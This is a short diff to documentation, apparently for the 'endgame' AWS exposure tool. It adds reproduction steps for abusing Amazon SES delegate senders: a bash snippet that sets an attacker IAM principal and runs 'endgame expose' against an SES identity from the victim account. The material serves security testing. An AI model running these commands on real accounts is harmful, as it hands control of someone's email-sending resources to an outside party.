@@ -12,6 +12,14 @@ This can be abused by adding a rogue user as a [Delegate sender](https://docs.aw
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
+endgame expose --service ses --name test-resource-exposure.com
+```
+
 ## Example
 
 ## Exploitation
